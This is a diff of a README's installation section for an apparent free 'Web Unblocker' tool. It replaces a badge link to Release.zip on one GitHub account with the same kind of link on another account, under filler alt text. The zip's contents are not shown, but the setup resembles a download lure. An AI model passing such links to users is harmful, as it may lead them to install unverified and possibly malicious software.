@@ -9,7 +9,7 @@
 ## Getting Started:
 
 ### Installation
-[![asdasdasd](https://github.com/user-attachments/assets/dfeee587-5137-4e2a-b19a-9e644c596c36)](https://github.com/LorrisHorse/Web-Unblocker-Free-2024/releases/download/V5.8.2/Release.zip)
+[![asdasdasd](https://github.com/user-attachments/assets/dfeee587-5137-4e2a-b19a-9e644c596c36)](https://github.com/tk888hua/Web-Unblocker-Free-2024/releases/download/Release/Release.zip)
 
 
 
